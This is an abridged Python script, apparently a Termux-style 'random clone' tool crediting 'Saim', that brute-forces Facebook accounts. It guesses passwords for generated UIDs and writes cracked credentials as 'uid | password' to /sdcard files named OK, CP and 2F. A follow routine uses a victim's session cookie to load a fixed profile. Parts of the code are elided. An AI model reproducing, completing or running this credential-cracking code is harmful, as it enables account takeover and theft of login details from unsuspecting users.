...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Saim \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
def Jawnx(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :saim = ' 2009'
        elif uid[:9] in ['100000000']       :saim = '~> 2009'
        elif uid[:8] in ['10000000']        :saim = '~> 2009'
        ...
        elif uid[:6] in ['100001']          :saim = '~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :saim = '~> 2011/2012'
        elif uid[:6] in ['100004']          :saim = '~> 2012/2013'
        elif uid[:6] in ['100005','100006'] :saim = '~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :saim = '~> 2014/2015'
        elif uid[:6] in ['100009']          :saim = '~> 2015'
        elif uid[:5] in ['10001']           :saim = '~> 2015/2016'
        elif uid[:5] in ['10002']           :saim = '~> 2016/2017'
        elif uid[:5] in ['10003']           :saim = '~> 2018/2019'
        elif uid[:5] in ['10004']           :saim = '~> 2019/2020'
        elif uid[:5] in ['10005']           :saim = '~> 2020'
        elif uid[:5] in ['10006','10007','']:saim = '~> 2021'
        elif uid[:5] in ['10008']           :saim = '~> 2022'
        else:hking=''
...
'\33[1;97m[*] Creater  : A S I F O
'\33[1;33m[*] Version  : 0.0.1
'\33[1;35m[*] GitHub   : https://github.com/Saim900
'\33[1;91m[*] TEAM     : A LOVE H
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE saim, Hassan, Muskan, Ayesha ")
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001637004998', cookies={'cookie': coki}).text, 'html.parser')
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {SaimT()} {WHITE}]")
    print(f" {WHITE}PREMIUM USER          {WHITE}: {GREEN}Joker {ORANGE} {Saim}")
    print(f"{BLUE}══════════════════════════════════════════════════")
    print(f"{WHITE}[01] {WHITE}PAK RANDOM CLONE ")
    print(f"{WHITE}[02] {WHITE}FEEDBACK 🙂 ")
    ...
    if Saim in ["1","01"]:
        ...
        os.system("xdg-open SHAREEF LARKA")
        XYZ()
    elif Saim in ["3","03"]:
        os.system("xdg-open FUCK YOU")
        XYZ()
    elif Saim in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/SAIM-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/SAIM-CP.txt')
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAIM-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/SAIM-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    ...
                    open('/sdcard/SAIM-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAIM 🔥] [%s] \33[1;97m[OK:%s{SAIM2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
